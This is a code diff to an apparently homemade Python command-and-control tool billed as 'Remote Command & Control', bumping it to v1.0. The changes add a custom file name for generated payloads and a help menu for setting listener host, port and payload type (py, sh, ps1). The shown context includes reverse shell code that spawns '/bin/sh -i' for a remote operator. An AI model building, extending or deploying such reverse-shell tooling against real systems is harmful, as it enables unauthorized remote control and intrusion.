@@ -25,6 +25,7 @@ SESSION_COMMANDS = ["background", "die"]
 PAYLOAD_COMMANDS = ["set ", "generate ", "back ", "options ", "help "]
 
 payload_settings = {
+    "name": None,
     "lhost": "127.0.0.1",
     "lport": "80",
     "payload": "sh"
@@ -161,7 +162,7 @@ def cli():
 ██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
 ███████╗███████║   ██║   ██║ ╚████║██║  ██║
 ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
-    Remote Command & Control - v0.9 {RESET}
+    Remote Command & Control v1.0{RESET}
 """)
     while True:
         try:
@@ -227,6 +228,15 @@ def show_help():
     <any command>       - Execute command on client
     background          - Return to main menu
     die                 - Terminate current session
+{ORANGE}Payload Menu Commands:{RESET}
+    set name <name>     - Custom name for reverse shell
+    set lhost <ip>      - Set the LSTNR IP address
+    set lport <port>    - Set the LSTNR listening port
+    set payload <type>  - Set payload type (EX: py, sh, ps1)
+    options             - Show current payload configuration
+    generate            - Generate the payload with current settings
+    back                - Return to the main menu
+    help                - Show this help menu
 """)
 
 
@@ -347,12 +357,15 @@ def handle_payload_set(cmd):
     else:
         print("Usage: set <key> <value>")
 
+
 def show_payload_options():
     print("Current Payload Settings:")
     for key, value in payload_settings.items():
-        print(f"  {key}: {value}")
+        print(f"  {key}: {value if value is not None else 'default'}")
+
 
 def generate_payload():
+    name = payload_settings.get("name")
     lhost = payload_settings["lhost"]
     lport = payload_settings["lport"]
     payload_type = payload_settings["payload"]
@@ -393,7 +406,11 @@ subprocess.call(["/bin/sh", "-i"])
         print(f"Unknown payload type: {payload_type}")
         return
 
-    filename = f"{lhost}_{lport}.{payload_type if payload_type != 'py' else 'py'}"
+    if name:
+        filename = f"{name}.{payload_type if payload_type != 'py' else 'py'}"
+    else:
+        filename = f"{lhost}_{lport}.{payload_type if payload_type != 'py' else 'py'}"
+
     with open(filename, "w") as f:
         f.write(payload)
     print(f"Payload generated and saved to {filename}\n")
